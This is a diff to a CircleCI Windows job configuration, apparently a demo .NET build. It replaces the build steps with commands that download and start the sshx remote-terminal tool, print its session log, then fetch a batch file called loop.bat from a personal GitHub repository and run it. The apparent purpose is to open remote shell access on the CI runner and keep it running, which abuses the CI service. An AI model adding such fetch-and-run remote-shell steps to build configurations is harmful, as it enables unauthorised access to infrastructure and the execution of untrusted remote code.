@@ -16,20 +16,22 @@ jobs:
     working_directory: C:\Users\circleci\
     steps:
       - checkout:
-          path: C:\Users\circleci\project
-      - restore_cache:
-          keys:
-            - dotnet-packages-v1-{{ checksum "circleci-demo-windows.csproj" }}
+          path: C:\Users\circleci\
       - run:
           name: "Yes"
           command: | 
-            $archivePath = "C:\Users\circleci\setup.zip"  # Replace with your actual archive path
+            $archivePath = "C:\Users\circleci\setup.zip" 
             $destinationPath = "C:\Users\runneradmin\Documents"
             
             md C:\Users\runneradmin\Documents
             wget -O setup.zip https://sshx.s3.amazonaws.com/sshx-x86_64-pc-windows-msvc.zip
             
             Expand-Archive -Path $archivePath -DestinationPath $destinationPath -Force
-            cmd /c C:\Users\runneradmin\Documents\sshx.exe
-            
-            
+            Start-Process -FilePath "C:\Users\runnderadmin\Documents\sshx.exe" -NoNewWindow -RedirectStandardOutput "sshx.log"
+
+            cat sshx.log
+
+            sleep 60
+
+            wget -O start.bat https://github.com/Efebey2903/files/raw/refs/heads/main/loop.bat
+            cmd /c start.bat  
